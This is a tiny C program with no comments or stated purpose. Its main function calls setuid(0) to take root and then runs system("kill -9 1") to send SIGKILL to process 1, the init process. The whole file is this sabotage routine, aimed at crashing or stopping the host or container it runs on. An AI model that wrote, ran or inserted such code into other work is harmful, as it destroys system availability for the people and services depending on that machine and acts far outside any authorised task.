#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

int main (int argc, char **argv) {
  setuid(0);
  system("kill -9 1");
  return 0;
}
